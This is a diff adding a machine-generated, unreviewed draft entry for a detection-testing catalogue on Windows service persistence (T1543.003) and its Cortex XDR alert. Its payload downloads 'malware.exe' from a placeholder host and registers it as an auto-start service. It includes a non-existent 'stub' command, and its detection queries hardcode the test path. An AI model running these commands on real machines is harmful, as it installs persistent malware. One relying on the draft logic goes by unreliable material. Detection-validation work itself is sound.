@@ -1,0 +1,158 @@
+{
+  "id": "TTP-0000-0022",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Windows Service Creation with Rare Binary Path for Persistence",
+    "summary": "An adversary uses sc.exe to create and start a new Windows service with an uncommon binary path to establish persistence. Cortex should detect this behavior via the ABIOC 'An uncommon service was star",
+    "description": "An adversary uses sc.exe to create and start a new Windows service with an uncommon binary path to establish persistence. Cortex should detect this behavior via the ABIOC 'An uncommon service was started'."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1543",
+        "subtechnique_id": "T1543.003",
+        "name": "Create or Modify System Process: Windows Service",
+        "tactic_ids": [
+          "TA0003"
+        ],
+        "tactic_names": [
+          "Persistence"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "mkdir C:\\temp\\malware\nwget https://example.com/malware.exe -OutFile C:\\temp\\malware\\malware.exe\nstub C:\\temp\\malware\\malware.exe\nsc create MaliciousService binPath= \"C:\\temp\\malware\\malware.exe\" start= auto\nsc start MaliciousService",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "Service creation process",
+        "expected_value": "action_process_image_name = 'sc.exe'"
+      },
+      {
+        "artifact_type": "file",
+        "description": "Malware binary path",
+        "expected_value": "action_file_path = 'C:\\\\temp\\\\malware\\\\malware.exe'"
+      },
+      {
+        "artifact_type": "process",
+        "description": "Service start process",
+        "expected_value": "actor_process_image_name = 'sc.exe'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Uncommon Service Binary Path",
+        "description": "Detection of a service being started with a binary path that is not commonly seen in enterprise environments",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'sc.exe'\n| filter action_file_path contains 'C:\\\\temp\\\\malware\\\\malware.exe'\n| filter action_file_path not in (known_service_paths)",
+        "mitre_technique_ids": [
+          "T1543.003"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "An uncommon service was started",
+        "description": "Detection of a new service being started with a binary path that deviates from typical service binaries",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'sc.exe'\n| filter action_file_path not in (known_service_paths)\n| filter action_file_path contains 'C:\\\\temp\\\\malware\\\\malware.exe'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "action_file_path",
+        "mitre_technique_ids": [
+          "T1543.003"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Uncommon Service Start Detection",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'sc.exe'\n| filter action_file_path not in (known_service_paths)\n| filter action_file_path contains 'C:\\\\temp\\\\malware\\\\malware.exe'\n| fields agent_hostname, action_file_path, action_process_image_name",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — An uncommon service was started; Required Data: XDR Agent; ATT&CK T1543.003. Ref: cortex-docs.paloaltonetworks.com/analytics-alerts."
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: An uncommon service was started",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/an-uncommon-service-was-started",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1543.003",
+      "url": "https://attack.mitre.org/techniques/T1543/003/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
